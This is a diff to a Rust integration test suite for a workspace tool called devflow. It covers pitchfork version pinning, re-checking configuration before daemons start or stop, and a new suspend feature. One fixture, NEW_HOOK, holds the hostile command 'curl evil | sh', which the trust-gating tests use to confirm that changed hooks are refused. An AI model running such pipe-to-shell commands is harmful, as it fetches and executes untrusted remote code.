@@ -8,9 +8,11 @@ use devflow_core::processes::{
     self, Action, NamespaceOutcome, NamespaceSource, Refusal, StartOptions, StopOptions,
 };
 use devflow_core::receipt::{Receipt, Status};
+use devflow_core::remedy::Remedy;
 use devflow_core::setup::{
     self, CreateRequest, NoProgress, RemoveOptions, SetupOptions, SetupOutcome,
 };
+use devflow_core::tools::{self, Reason, Tool, Version};
 use devflow_core::worktree::{self, Workspace};
 use devflow_core::{Project, trust};
 use serde_json::{Value, json};
@@ -289,77 +291,91 @@ fn a_shim_that_exits_one_is_not_installed_even_though_it_is_executable() {
 }
 
 #[test]
-fn a_working_build_reports_its_version_and_every_feature() {
+fn a_working_build_reports_its_version_and_is_asked_nothing_else() {
     let fake = Fake::new();
     let detection = fake.pitchfork().detect();
     assert!(detection.installed && detection.usable(), "{detection:?}");
     assert_eq!(detection.version.as_deref(), Some("2.29.0"));
-    assert!(detection.missing_features.is_empty(), "{detection:?}");
+    assert!(detection.unsupported.is_none(), "{detection:?}");
+    // The pin stands for every feature devflow calls: no `--help` is read.
     let asked: Vec<String> = fake.calls().into_iter().map(|c| c.1).collect();
-    for expected in ["--version", "list --help", "proxy status --help"] {
-        assert!(asked.contains(&expected.to_string()), "{asked:?}");
+    assert_eq!(asked, ["--version"]);
+}
+
+#[test]
+fn a_build_older_than_the_pin_is_named_and_unusable_with_a_way_to_upgrade() {
+    // 2.14.0 has `list --json` and `proxy status --json` and not `supervisor
+    // status --json`, which devflow reads: the pin is the newest of them.
+    for version in ["2.19.9", "2.14.0", "2.0.0", "1.6.0", "0.9.2"] {
+        let fake = Fake::new();
+        fake.set("version", version);
+        let detection = fake.pitchfork().detect();
+        assert!(detection.installed && !detection.usable(), "{version}");
+        let problem = detection.unsupported.as_ref().expect("a typed problem");
+        assert_eq!(problem.tool, Tool::Pitchfork);
+        assert_eq!(problem.minimum, tools::MIN_PITCHFORK);
+        assert_eq!(
+            problem.reason,
+            Reason::TooOld {
+                found: Version::parse(version).unwrap()
+            },
+            "{version}"
+        );
+        let summary = detection.summary();
+        assert!(
+            summary.contains(&format!("pitchfork {version} is older than 2.20.0")),
+            "{summary}"
+        );
+        // The remedies are the problem's: upgrade through mise, or read the page.
+        assert_eq!(problem.remedies()[0], Remedy::InstallPitchfork);
+        assert!(
+            problem
+                .remedies()
+                .iter()
+                .any(|r| matches!(r, Remedy::OpenGuide { .. })),
+            "{version}"
+        );
     }
 }
 
 #[test]
-fn missing_features_are_named_and_make_the_build_unusable() {
-    let fake = Fake::new();
-    fake.set("missing", "proxy status --json\nlist --json\n");
-    let detection = fake.pitchfork().detect();
-    assert!(detection.installed);
-    assert!(!detection.usable());
-    assert_eq!(
-        detection.missing_features,
-        ["list --json", "proxy status --json"]
-    );
-    assert!(
-        detection
-            .summary()
-            .contains("lacks list --json, proxy status --json"),
-        "{}",
-        detection.summary()
-    );
-}
-
-#[test]
-fn a_build_before_namespaced_ids_cannot_start_or_stop_by_id() {
-    // pitchfork 1.x has no namespace in a daemon id: `start ns/name` does not
-    // mean what devflow needs, and `--local` is the only thing left, which
-    // reaches the daemons of parent directories. Such a build is unusable.
-    for version in ["1.6.0", "0.9.2", "garbled"] {
+fn a_version_that_cannot_be_read_is_unusable_not_assumed_old_or_new() {
+    for version in ["garbled", "dev", "2"] {
         let fake = Fake::new();
         fake.set("version", version);
         let detection = fake.pitchfork().detect();
-        assert!(detection.installed && !detection.usable(), "{detection:?}");
+        assert!(detection.installed && !detection.usable(), "{version}");
         assert_eq!(
-            detection.missing_features,
-            [pitchfork::QUALIFIED_IDS],
+            detection.unsupported.as_ref().map(|p| &p.reason),
+            Some(&Reason::Unreadable),
             "{version}"
         );
         assert!(
-            detection.summary().contains("namespace/name"),
+            detection.summary().contains("cannot be read"),
             "{}",
             detection.summary()
         );
     }
+}
+
+#[test]
+fn the_pin_and_everything_after_it_is_usable() {
     let fake = Fake::new();
-    for version in ["2.0.0", "2.25.0", "2.30.1", "3.1.0"] {
+    for version in ["2.20.0", "2.25.0", "2.30.1", "2.100.0", "3.1.0"] {
         fake.set("version", version);
-        assert!(fake.pitchfork().detect().usable(), "{version}");
+        let detection = fake.pitchfork().detect();
+        assert!(detection.usable(), "{version}: {detection:?}");
     }
 }
 
 #[test]
-fn what_acts_on_pitchfork_needs_every_feature_and_not_only_a_version() {
+fn what_acts_on_pitchfork_needs_a_supported_release_and_not_only_a_working_one() {
     let t = repo(Some(WEB), "");
     let ws = ready(&t, "feature", true);
     for (what, setup) in [
-        ("lacks list --json", ("missing", "list --json\n")),
-        (
-            "lacks proxy status --json",
-            ("missing", "proxy status --json\n"),
-        ),
-        ("namespace/name", ("version", "1.6.0")),
+        ("older than 2.20.0", ("version", "2.14.0")),
+        ("older than 2.20.0", ("version", "1.6.0")),
+        ("cannot be read", ("version", "garbled")),
     ] {
         // `--version` works in each of them; a build that runs is not enough.
         let fake = Fake::new();
@@ -415,7 +431,7 @@ fn detection_is_remembered_for_a_moment_and_can_be_forgotten() {
     let fake = Fake::new();
     let t = repo(Some(WEB), "");
     let ws = ready(&t, "feature", true);
-    let helps = |fake: &Fake| fake.calls().iter().filter(|c| c.1 == "list --help").count();
+    let helps = |fake: &Fake| fake.calls().iter().filter(|c| c.1 == "--version").count();
     for _ in 0..3 {
         processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
     }
@@ -2246,9 +2262,17 @@ fn config_with(t: &Repo, extra: &str) -> String {
     std::fs::read_to_string(t.root.join("devflow.toml")).unwrap() + extra
 }
 
-const NEW_SERVICE_AND_ENV: &str =
-    "\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n\n[env]\nFOO = \"bar\"\n";
-const NEW_HOOK: &str = "\n[hooks]\nsetup = [\"curl evil | sh\"]\n";
+/// The workspace's own `devflow.toml` as it is now, with `extra` appended: the
+/// recipes (hooks, `[env]`) a workspace runs are its branch's.
+fn own_config_with(ws: &Workspace, extra: &str) -> String {
+    std::fs::read_to_string(ws.path.join("devflow.toml")).unwrap() + extra
+}
+
+const NEW_SERVICE: &str = "\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n";
+const NEW_ENV: &str = "\n[env]\nFOO = \"bar\"\n";
+/// A `switch` hook: it changes what an approval covers and, unlike a setup
+/// hook, reopens nothing (the workspace stays ready).
+const NEW_HOOK: &str = "\n[hooks]\nswitch = [\"curl evil | sh\"]\n";
 
 #[test]
 fn start_looks_again_at_devflows_own_configuration_not_at_the_one_it_loaded() {
@@ -2257,8 +2281,8 @@ fn start_looks_again_at_devflows_own_configuration_not_at_the_one_it_loaded() {
     let ws = ready(&t, "feature", true);
     let config = t.root.join("devflow.toml");
     // While devflow asks pitchfork what runs, the main checkout's devflow.toml
-    // gains a service and an [env] recipe. The Project it holds does not know.
-    change_while_asking(&fake, &config, &config_with(&t, NEW_SERVICE_AND_ENV));
+    // gains a service (a shared section). The Project it holds does not know.
+    change_while_asking(&fake, &config, &config_with(&t, NEW_SERVICE));
     let error = start(&t, &fake, &ws).unwrap_err();
     assert!(
         std::fs::read_to_string(&config)
@@ -2266,16 +2290,12 @@ fn start_looks_again_at_devflows_own_configuration_not_at_the_one_it_loaded() {
             .contains("[services.db]"),
         "the change did land"
     );
-    // A reloaded project calls the workspace not ready and its scope unapproved…
+    // A reloaded project calls the workspace not ready…
     let reloaded = t.project.reload().unwrap();
     assert_eq!(
         setup::receipt(&reloaded, &ws).unwrap().unwrap().status(),
         Status::NeedsAttention
     );
-    assert!(matches!(
-        trust::state_at(&reloaded, &ws.path).unwrap(),
-        trust::TrustState::Untrusted { .. }
-    ));
     // …and so does the start: it was refused, nothing was started.
     assert!(
         matches!(
@@ -2292,13 +2312,13 @@ fn start_looks_again_at_the_hooks_and_recipes_devflow_would_run() {
     let fake = Fake::new();
     let t = repo(Some(WEB), "");
     let ws = ready(&t, "feature", true);
-    // A hook appears in the main checkout's configuration while devflow asks:
+    // A hook appears in the workspace's own configuration while devflow asks:
     // the workspace is as ready as before, but the approval no longer covers
-    // what devflow.toml asks to run.
+    // what its devflow.toml asks to run.
     change_while_asking(
         &fake,
-        &t.root.join("devflow.toml"),
-        &config_with(&t, NEW_HOOK),
+        &ws.path.join("devflow.toml"),
+        &own_config_with(&ws, NEW_HOOK),
     );
     let error = start(&t, &fake, &ws).unwrap_err();
     assert!(
@@ -2335,12 +2355,12 @@ fn stop_and_removal_look_again_at_devflows_own_configuration() {
     let t = repo(Some(WEB), "");
     let ws = ready(&t, "feature", true);
     let ns = running_fixture(&t, &fake, &ws);
-    let config = t.root.join("devflow.toml");
+    let config = ws.path.join("devflow.toml");
     let original = std::fs::read_to_string(&config).unwrap();
-    // A hook lands in devflow.toml after the plan was drawn (while pitchfork
-    // is asked what runs): the scope pitchfork would stop under is not the
-    // approved one.
-    change_while_asking(&fake, &config, &config_with(&t, NEW_HOOK));
+    // A hook lands in the workspace's devflow.toml after the plan was drawn
+    // (while pitchfork is asked what runs): the scope pitchfork would stop
+    // under is not the approved one.
+    change_while_asking(&fake, &config, &own_config_with(&ws, NEW_HOOK));
     let error = down(&t, &fake, &ws, false).unwrap_err();
     assert!(
         matches!(
@@ -2363,7 +2383,7 @@ fn stop_and_removal_look_again_at_devflows_own_configuration() {
     assert_eq!(plan.daemons(), [format!("{ns}/web")]);
     // …and the configuration changes before the stop is carried out, while the
     // Project in hand still has the old one.
-    std::fs::write(&config, config_with(&t, NEW_SERVICE_AND_ENV)).unwrap();
+    std::fs::write(&config, own_config_with(&ws, NEW_ENV)).unwrap();
     let error = processes::stop_for_removal(&t.project, &ws, &plan, false).unwrap_err();
     assert!(
         matches!(
@@ -2387,7 +2407,7 @@ fn stop_and_removal_look_again_at_devflows_own_configuration() {
     // A configuration that cannot be read cannot be judged either; --force
     // accepts that, with the same warning.
     fake.clear_calls();
-    std::fs::write(&config, "[project\nname = ").unwrap();
+    std::fs::write(t.root.join("devflow.toml"), "[project\nname = ").unwrap();
     let error = processes::stop_for_removal(&t.project, &ws, &plan, false).unwrap_err();
     assert!(
         matches!(refusal(&error), Refusal::Unreadable { .. }),
@@ -2538,9 +2558,9 @@ fn an_unreadable_state_is_not_nothing_running() {
 }
 
 #[test]
-fn removal_cannot_tell_what_runs_on_a_build_that_lacks_a_feature() {
+fn removal_cannot_tell_what_runs_on_a_build_older_than_the_pin() {
     let fake = Fake::new();
-    fake.set("missing", "list --json\n");
+    fake.set("version", "2.14.0");
     let t = repo(Some(WEB), "");
     let ws = ready(&t, "feature", true);
     let error = setup::remove(
@@ -2555,7 +2575,7 @@ fn removal_cannot_tell_what_runs_on_a_build_that_lacks_a_feature() {
         .unwrap_or_else(|| panic!("{error:#}"));
     assert!(protected.forceable, "{}", protected.reason);
     assert!(
-        protected.reason.contains("lacks list --json"),
+        protected.reason.contains("older than 2.20.0"),
         "{}",
         protected.reason
     );
@@ -2578,7 +2598,7 @@ fn removal_cannot_tell_what_runs_on_a_build_that_lacks_a_feature() {
     // A project that has no pitchfork file in the workspace has nothing to
     // ask about, so pitchfork is not even looked at.
     let fake = Fake::new();
-    fake.set("missing", "list --json\n");
+    fake.set("version", "2.14.0");
     let plain = repo(None, "");
     let ws = ready(&plain, "plain", true);
     setup::remove(
@@ -5841,4 +5861,331 @@ fn an_env_file_the_gate_cannot_read_is_a_typed_problem_with_its_remedy() {
     // The refusal offers what the problem carries, for the workspace asked.
     assert!(!refusal(&error).remedies(&ws.path).is_empty());
     assert!(fake.mutations().is_empty());
+}
+
+// --- suspend ---------------------------------------------------------------
+
+#[test]
+fn suspend_stops_the_daemons_through_the_gated_stop_and_records_it() {
+    let fake = Fake::new();
+    let t = repo(Some(WEB), "");
+    let ws = ready(&t, "feature", true);
+    let ns = running_fixture(&t, &fake, &ws);
+
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, Some(&fake.pitchfork()));
+    assert!(suspension.suspended, "{suspension:?}");
+    // The workspace's own daemon, by full id; the other namespace's is left alone.
+    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
+    assert_never_local(&fake);
+    assert!(suspension.daemons.as_ref().unwrap().ok());
+    let receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
+    assert!(receipt.suspended_at.is_some());
+    // The receipt stays version 2 and nothing else was disturbed.
+    assert_eq!(receipt.version, 2);
+    assert!(receipt.processes.is_none());
+
+    // Starting the daemons again ends the rest: it is not suspended any more.
+    fake.json(
+        "list.json",
+        &json!([listed(&ns, "web", "available", None, Some(3000))]),
+    );
+    start(&t, &fake, &ws).unwrap();
+    assert!(
+        setup::receipt(&t.project, &ws)
+            .unwrap()
+            .unwrap()
+            .suspended_at
+            .is_none()
+    );
+}
+
+#[test]
+fn suspend_does_not_mark_a_workspace_whose_daemons_it_may_not_or_cannot_stop() {
+    use devflow_core::remedy::Remedy;
+    let fake = Fake::new();
+    let t = repo(Some(WEB), "");
+    let ws = ready(&t, "feature", true);
+    running_fixture(&t, &fake, &ws);
+
+    // The configuration changed since it was approved: pitchfork would run
+    // the new on_stop, so the same refusal `down` gives applies, with its remedy.
+    std::fs::write(ws.path.join("pitchfork.toml"), EVIL).unwrap();
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, Some(&fake.pitchfork()));
+    assert!(!suspension.suspended);
+    assert!(suspension.services.is_none(), "containers stay up");
+    assert!(
+        suspension
+            .problem
+            .as_deref()
+            .is_some_and(|p| p.contains("lifecycle hooks")),
+        "{suspension:?}"
+    );
+    assert!(
+        suspension
+            .remedies
+            .iter()
+            .any(|r| matches!(r, Remedy::Trust { .. })),
+        "{:?}",
+        suspension.remedies
+    );
+    assert!(fake.mutations().is_empty());
+    assert!(
+        setup::receipt(&t.project, &ws)
+            .unwrap()
+            .unwrap()
+            .suspended_at
+            .is_none()
+    );
+
+    // A state pitchfork will not show is unknown, never stopped.
+    std::fs::write(ws.path.join("pitchfork.toml"), WEB).unwrap();
+    fake.set("list_fail", "1");
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, Some(&fake.pitchfork()));
+    assert!(!suspension.suspended);
+    assert!(suspension.services.is_none());
+    assert!(fake.mutations().is_empty());
+    assert!(
+        setup::receipt(&t.project, &ws)
+            .unwrap()
+            .unwrap()
+            .suspended_at
+            .is_none()
+    );
+
+    // No pitchfork at all while the workspace declares daemons: same.
+    fake.unset("list_fail");
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, None);
+    assert!(!suspension.suspended);
+    assert!(suspension.problem.is_some());
+}
+
+#[test]
+fn a_workspace_without_daemons_or_containers_is_suspended_without_pitchfork() {
+    let t = repo(None, "");
+    let ws = ready(&t, "feature", false);
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, None);
+    assert!(suspension.suspended, "{suspension:?}");
+    assert!(suspension.daemons.is_none());
+    assert!(suspension.services.as_ref().unwrap().services.is_empty());
+}
+
+fn marked(t: &Repo, ws: &Workspace) -> bool {
+    setup::receipt(&t.project, ws)
+        .unwrap()
+        .unwrap()
+        .suspended_at
+        .is_some()
+}
+
+#[test]
+fn suspend_holds_the_process_lock_from_the_first_look_to_the_record() {
+    // The watcher probes the lock with a descriptor of its own, and a process
+    // another test thread is spawning holds a duplicate of every descriptor
+    // until it execs: the lock then reads as held before the suspension took
+    // it, and the run looks broken in two. Alone in a child process, nothing
+    // else spawns.
+    if !in_child(
+        "suspend_holds_the_process_lock_from_the_first_look_to_the_record",
+        &[],
+    ) {
+        return;
+    }
+    let fake = Fake::new();
+    let t = repo(Some(WEB), "");
+    let ws = ready(&t, "feature", true);
+    let ns = running_fixture(&t, &fake, &ws);
+    // The stop takes a while, so there is a window for an `up` or a `switch`
+    // to try its luck.
+    fake.set("stop_sleep", "1");
+
+    let samples = std::sync::Arc::new(std::sync::Mutex::new(Vec::<bool>::new()));
+    let done = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let watcher = {
+        let (samples, done, git_dir) = (samples.clone(), done.clone(), ws.git_dir.clone());
+        std::thread::spawn(move || {
+            while !done.load(std::sync::atomic::Ordering::SeqCst) {
+                // `true`: somebody else could take the lock right then.
+                let free = Receipt::try_process_lock(&git_dir).unwrap().is_some();
+                samples.lock().unwrap().push(free);
+                std::thread::yield_now();
+            }
+        })
+    };
+    std::thread::sleep(Duration::from_millis(50));
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, Some(&fake.pitchfork()));
+    std::thread::sleep(Duration::from_millis(50));
+    done.store(true, std::sync::atomic::Ordering::SeqCst);
+    watcher.join().unwrap();
+    assert!(suspension.suspended, "{suspension:?}");
+    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
+
+    // free, then held without a gap until the end, then free.
+    let samples = samples.lock().unwrap();
+    let held: Vec<usize> = samples
+        .iter()
+        .enumerate()
+        .filter(|(_, free)| !**free)
+        .map(|(at, _)| at)
+        .collect();
+    assert!(held.len() > 10, "the lock was held while it stopped");
+    let (first, last) = (held[0], *held.last().unwrap());
+    assert!(
+        samples[first..=last].iter().all(|free| !free),
+        "another operation could have taken the lock in the middle"
+    );
+}
+
+#[test]
+fn suspend_gives_way_to_an_operation_that_holds_the_process_lock() {
+    let fake = Fake::new();
+    let t = repo(Some(WEB), "");
+    let ws = ready(&t, "feature", true);
+    running_fixture(&t, &fake, &ws);
+    // An `up` or a `switch` is in the middle of its work.
+    let _busy = Receipt::try_process_lock(&ws.git_dir).unwrap().unwrap();
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, Some(&fake.pitchfork()));
+    assert!(!suspension.suspended);
+    assert!(
+        suspension
+            .remedies
+            .contains(&devflow_core::remedy::Remedy::Retry)
+    );
+    assert!(fake.mutations().is_empty());
+    assert!(!marked(&t, &ws));
+    // Pinning waits its turn behind the same lock.
+    assert!(devflow_core::suspend::set_pinned(&t.project, &ws, true).is_err());
+}
+
+#[test]
+fn a_daemon_nobody_declares_and_devflow_never_recorded_is_still_asked_about() {
+    let fake = Fake::new();
+    let t = repo(Some(WEB), "");
+    let ws = ready(&t, "feature", true);
+    let ns = running_fixture(&t, &fake, &ws);
+    // Started straight through pitchfork, whose definition was then removed:
+    // the files declare nothing and the receipt records no start.
+    std::fs::write(ws.path.join("pitchfork.toml"), "# nothing is declared\n").unwrap();
+    assert!(!processes::has_daemons(&t.project, &ws));
+    assert!(
+        setup::receipt(&t.project, &ws)
+            .unwrap()
+            .unwrap()
+            .processes
+            .is_none()
+    );
+
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, Some(&fake.pitchfork()));
+    assert!(suspension.suspended, "{suspension:?}");
+    assert_eq!(
+        fake.mutations(),
+        [format!("stop {ns}/web")],
+        "it was found and stopped"
+    );
+
+    // And when it cannot be asked, the workspace is not reported as at rest.
+    let t = repo(Some(WEB), "");
+    let ws = ready(&t, "other", true);
+    std::fs::write(ws.path.join("pitchfork.toml"), "# nothing is declared\n").unwrap();
+    let suspension = devflow_core::suspend::suspend(&t.project, &ws, None);
+    assert!(!suspension.suspended);
+    assert!(!marked(&t, &ws));
+}
+
+#[test]
+fn a_selection_is_judged_again_under_the_locks_before_anything_stops() {
+    use devflow_core::suspend::{Expect, select_idle, suspend_expecting};
+    let t = repo(None, "");
+    let ws = ready(&t, "feature", false);
+    let age = |days: i64| {
+        let mut receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
+        receipt.last_active_at = Some(chrono::Utc::now() - chrono::Duration::days(days));
+        receipt.save(&ws.git_dir).unwrap();
+    };
+    let selected = |t: &Repo| {
+        let selection = select_idle(
+            &t.project,
+            Duration::from_secs(3 * 86_400),
+            chrono::Utc::now(),
+            None,
+        )
+        .unwrap();
+        selection.idle.into_iter().next().expect("idle")
+    };
+
+    // Pinned while the person was asked.
+    age(10);
+    let idle = selected(&t);
+    let expect = Expect {
+        instance: idle.instance,
+        idle: Duration::from_secs(3 * 86_400),
+    };
+    devflow_core::suspend::set_pinned(&t.project, &ws, true).unwrap();
+    let result = suspend_expecting(&t.project, &ws, None, Some(&expect));
+    assert!(!result.suspended && result.problem.is_none());
+    assert!(result.left_alone.as_deref().unwrap().contains("pinned"));
+    assert!(!marked(&t, &ws));
+    devflow_core::suspend::set_pinned(&t.project, &ws, false).unwrap();
+
+    // Used (entered) while the person was asked.
+    age(0);
+    let result = suspend_expecting(&t.project, &ws, None, Some(&expect));
+    assert!(result.left_alone.as_deref().unwrap().contains("used"));
+    assert!(!marked(&t, &ws));
+
+    // Replaced by another identity.
+    age(10);
+    let other = Expect {
+        instance: uuid::Uuid::new_v4(),
+        idle: expect.idle,
+    };
+    let result = suspend_expecting(&t.project, &ws, None, Some(&other));
+    assert!(result.left_alone.is_some() && !marked(&t, &ws));
+
+    // Unchanged: it goes.
+    let result = suspend_expecting(&t.project, &ws, None, Some(&expect));
+    assert!(result.suspended, "{result:?}");
+    assert!(marked(&t, &ws));
+}
+
+#[test]
+fn a_started_container_clears_the_mark_of_the_one_workspace_that_owns_its_branch() {
+    use devflow_core::config::Engine;
+    use devflow_core::receipt::{CloneReport, ServiceBinding};
+    let t = repo(None, "");
+    let (a, b) = (ready(&t, "a", false), ready(&t, "b", false));
+    let branch = uuid::Uuid::new_v4();
+    let bind = |ws: &Workspace, suspended: bool| {
+        let mut receipt = setup::receipt(&t.project, ws).unwrap().unwrap();
+        receipt.services.insert(
+            "cache".into(),
+            ServiceBinding::container(
+                Engine::Valkey,
+                branch,
+                "redis://x".into(),
+                None,
+                "empty".into(),
+                CloneReport {
+                    method: None,
+                    captured_at: None,
+                    allocated_bytes: None,
+                    source_downtime_ms: None,
+                },
+                None,
+            ),
+        );
+        receipt.suspended_at = suspended.then(chrono::Utc::now);
+        receipt.save(&ws.git_dir).unwrap();
+    };
+    bind(&a, true);
+    // Two workspaces claim the branch: nobody is positively its owner.
+    bind(&b, true);
+    devflow_core::suspend::clear_mark_of_branch(&t.root, "cache", branch);
+    assert!(marked(&t, &a) && marked(&t, &b));
+    // One owner: its mark goes, and only its mark.
+    let mut receipt = setup::receipt(&t.project, &b).unwrap().unwrap();
+    receipt.services.clear();
+    receipt.save(&b.git_dir).unwrap();
+    devflow_core::suspend::clear_mark_of_branch(&t.root, "cache", branch);
+    assert!(!marked(&t, &a));
+    assert!(marked(&t, &b));
 }
